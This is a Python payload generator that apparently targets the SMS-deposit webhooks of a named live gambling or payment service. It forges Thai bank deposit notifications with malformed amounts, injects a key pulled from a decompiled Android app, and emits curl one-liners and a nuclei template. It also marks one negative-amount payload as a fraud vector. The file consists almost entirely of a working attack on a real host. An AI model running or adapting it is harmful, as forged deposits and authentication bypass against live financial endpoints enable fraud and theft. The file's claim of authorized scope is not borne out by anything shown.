#!/usr/bin/env python3
"""
payloads.py — Luxino / ztechdev webhook injection payload generator
Scope: bot-auto.ztechdev.com (authorized — scope.json)

Usage:
    uv run payloads.py              # generate all payloads, print summary
    uv run payloads.py --json       # dump full payload set as JSON
    uv run payloads.py --curl       # print curl one-liners
    uv run payloads.py --nuclei     # write nuclei YAML template
    uv run payloads.py --out FILE   # save JSON to file
"""
import json
import sys
import time
import argparse
import re
from pathlib import Path
from datetime import datetime

# ── Target config ──────────────────────────────────────────────────────────
C2_BASE = "https://bot-auto.ztechdev.com"
ENDPOINTS = {
    "truewallet": "/webhooks/sms/truewallet",
    "kbank":      "/webhook-kbank",
    "scb":        "/webhook-scb",
    "sms":        "/webhook-sms",
}

BANKS = {
    "KBANK": {
        "address": "KBank",
        "messages": [
            "รับเงิน {amount} บาท จาก พร้อมเพย์",
            "โอนเงิน {amount} บาท เข้าบัญชี",
            "ได้รับเงิน {amount} บาท",
        ],
    },
    "SCB": {
        "address": "SCB",
        "messages": [
            "ได้รับเงินโอน {amount} บาท",
            "โอนเงิน {amount} บาท สำเร็จ",
        ],
    },
    "KTB": {
        "address": "KTB",
        "messages": ["รับเงิน {amount} บาท"],
    },
    "TRUEMONEY": {
        "address": "TrueMove H",
        "messages": ["รับ TrueMoney {amount} บาท"],
    },
}

# ── Amount variants ────────────────────────────────────────────────────────
AMOUNT_VARIANTS = [
    ("normal",    "100.00"),
    ("zero",      "0.00"),
    ("negative",  "-100.00"),
    ("overflow",  "999999999.99"),
    ("sci",       "1e2"),
    ("string",    "one hundred"),
    ("null",      "null"),
    ("empty",     ""),
    ("float_str", "100,00"),
    ("unicode",   "๑๐๐.๐๐"),
    ("space",     " 100.00 "),
]

# ── Static webhook key extraction ──────────────────────────────────────────
def get_static_key() -> str:
    candidates = [
        Path("nuxt/data/apk/jadx_out_all/LuxSms-v3/sources/com/example/appsms/api/ListApi.java"),
        Path.home() / "claude-red/nuxt/data/apk/jadx_out_all/LuxSms-v3/sources/com/example/appsms/api/ListApi.java",
        Path("/home/kzp/claude-red/nuxt/data/apk/jadx_out_all/LuxSms-v3/sources/com/example/appsms/api/ListApi.java"),
    ]
    for p in candidates:
        if p.exists():
            m = re.search(r'PAPDIEAW-KEY[:\s"]+([0-9a-fA-F]{64})', p.read_text())
            if m:
                return m.group(1)
    import os
    return os.environ.get("PAPDIEAW_KEY", "")


# ── Payload builder ────────────────────────────────────────────────────────
def build_payloads() -> list[dict]:
    payloads = []
    ts_base = int(time.time() * 1000)
    static_key = get_static_key()

    for bank_code, bank_info in BANKS.items():
        for msg_tmpl in bank_info["messages"]:
            for amount_label, amount_val in AMOUNT_VARIANTS:
                ts = ts_base + len(payloads)
                msg = msg_tmpl.format(amount=amount_val)

                ep_key = "truewallet" if bank_code == "TRUEMONEY" else \
                         "kbank" if bank_code == "KBANK" else \
                         "scb" if bank_code == "SCB" else "sms"

                body = {
                    "address":   bank_info["address"],
                    "message":   msg,
                    "timestamp": ts,
                    "bank_no":   "123-4-56789-0",
                    "smsid":     f"SMS_PROBE_{ts}",
                    "type":      "deposit",
                    "bank_code": bank_code,
                    "username":  "0812345678",
                    "password":  "1234",
                    "amount":    amount_val,
                }

                payloads.append({
                    "id":          f"{bank_code}_{amount_label}_{len(payloads):04d}",
                    "bank":        bank_code,
                    "amount_type": amount_label,
                    "endpoint":    ENDPOINTS[ep_key],
                    "url":         C2_BASE + ENDPOINTS[ep_key],
                    "headers": {
                        "Content-Type": "application/json",
                        **({"PAPDIEAW-KEY": static_key} if static_key and ep_key == "truewallet" else {}),
                    },
                    "body": body,
                    "note": (
                        "unauthenticated_bypass_test" if not static_key and ep_key == "truewallet" else
                        "static_key_injection" if static_key and ep_key == "truewallet" else
                        "no_auth_required"
                    ),
                })

    # Extra: negative-amount across all endpoints
    for ep_key, ep_path in ENDPOINTS.items():
        payloads.append({
            "id":          f"NEGAMT_{ep_key}_extra",
            "bank":        "KBANK",
            "amount_type": "negative_special",
            "endpoint":    ep_path,
            "url":         C2_BASE + ep_path,
            "headers":     {"Content-Type": "application/json"},
            "body": {
                "address":   "KBank",
                "message":   "รับเงิน -99999.00 บาท จาก พร้อมเพย์",
                "timestamp": ts_base,
                "bank_no":   "000-0-00000-0",
                "smsid":     f"SMS_NEG_{ts_base}",
                "type":      "deposit",
                "bank_code": "KBANK",
                "username":  "0812345678",
                "password":  "1234",
                "amount":    "-99999.00",
            },
            "note": "negative_amount_fraud_vector",
        })

    return payloads


# ── Output formatters ──────────────────────────────────────────────────────
def fmt_curl(p: dict) -> str:
    hdr = " ".join(f'-H "{k}: {v}"' for k, v in p["headers"].items())
    body = json.dumps(p["body"], ensure_ascii=False)
    return (
        f"# [{p['id']}] {p['note']}\n"
        f"curl -sk -X POST '{p['url']}' {hdr} "
        f"-d '{body}' -w '\\nHTTP:%{{http_code}}\\n'"
    )


def write_nuclei(payloads: list[dict], out: Path):
    by_ep: dict[str, list] = {}
    for p in payloads:
        by_ep.setdefault(p["endpoint"], []).append(p)

    lines = [
        "id: luxino-webhook-injection",
        "",
        "info:",
        "  name: Luxino SMS Webhook Injection — Full Variant Suite",
        "  author: pentest",
        "  severity: high",
        "  tags: webhook,injection,gambling,sms",
        "",
        "http:",
    ]

    for ep, eps in by_ep.items():
        sample = eps[0]
        lines += [
            "  - raw:",
            "      - |",
            f"        POST {{{{endpoint}}}}{ep} HTTP/1.1",
            "        Host: {{Hostname}}",
            "        Content-Type: application/json",
        ]
        if "PAPDIEAW-KEY" in sample["headers"]:
            lines.append("        PAPDIEAW-KEY: {{papdieaw_key}}")
        lines += [
            "",
            "        {{payload}}",
            "",
            "    payloads:",
            "      endpoint:",
            f"        - {C2_BASE}",
            "      payload:",
        ]
        for p in eps[:10]:
            lines.append(f"        - '{json.dumps(p['body'], ensure_ascii=False)}'")
        lines += [
            "",
            "    matchers-condition: or",
            "    matchers:",
            "      - type: status",
            "        status: [200, 201]",
            "      - type: word",
            "        words: ['success', 'accepted', 'processed', 'ok']",
            "",
        ]

    out.write_text("\n".join(lines))
    print(f"Nuclei template → {out}")


# ── Main ───────────────────────────────────────────────────────────────────
def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                  formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--json",   action="store_true", help="Dump payload set as JSON")
    ap.add_argument("--curl",   action="store_true", help="Print curl one-liners")
    ap.add_argument("--nuclei", action="store_true", help="Write nuclei YAML to lux_nuclei_webhook.yaml")
    ap.add_argument("--out",    metavar="FILE",       help="Save JSON to file")
    ap.add_argument("--filter", metavar="BANK",       help="Filter by bank (KBANK/SCB/KTB/TRUEMONEY)")
    ap.add_argument("--amount", metavar="TYPE",       help="Filter by amount variant")
    args = ap.parse_args()

    payloads = build_payloads()

    if args.filter:
        payloads = [p for p in payloads if p["bank"] == args.filter.upper()]
    if args.amount:
        payloads = [p for p in payloads if p["amount_type"] == args.amount]

    key_found = bool(get_static_key())

    if args.json or args.out:
        data = {
            "generated":        datetime.utcnow().isoformat() + "Z",
            "target":           C2_BASE,
            "static_key_found": key_found,
            "count":            len(payloads),
            "payloads":         payloads,
        }
        if args.out:
            Path(args.out).write_text(json.dumps(data, indent=2, ensure_ascii=False))
            print(f"Saved {len(payloads)} payloads → {args.out}")
        else:
            print(json.dumps(data, indent=2, ensure_ascii=False))
        return

    if args.curl:
        for p in payloads:
            print(fmt_curl(p))
            print()
        return

    if args.nuclei:
        write_nuclei(payloads, Path("lux_nuclei_webhook.yaml"))
        return

    # Default: summary
    by_ep: dict[str, int] = {}
    by_bank: dict[str, int] = {}
    for p in payloads:
        by_ep[p["endpoint"]] = by_ep.get(p["endpoint"], 0) + 1
        by_bank[p["bank"]] = by_bank.get(p["bank"], 0) + 1

    print(f"Luxino webhook payload generator — {datetime.utcnow().date()}")
    print(f"Target  : {C2_BASE}")
    print(f"Key     : {'✓ found (PAPDIEAW-KEY extracted)' if key_found else '✗ not found — set PAPDIEAW_KEY env var'}")
    print(f"Payloads: {len(payloads)}")
    print()
    print("By endpoint:")
    for ep, n in sorted(by_ep.items()):
        print(f"  {ep:<38} {n:>3}")
    print()
    print("By bank:")
    for bank, n in sorted(by_bank.items()):
        print(f"  {bank:<14} {n:>3}")
    print()
    print("Run with:")
    print("  uv run payloads.py --curl             # curl one-liners")
    print("  uv run payloads.py --nuclei           # nuclei YAML template")
    print("  uv run payloads.py --out payloads.json")
    print("  uv run payloads.py --filter KBANK --amount negative")


if __name__ == "__main__":
    main()
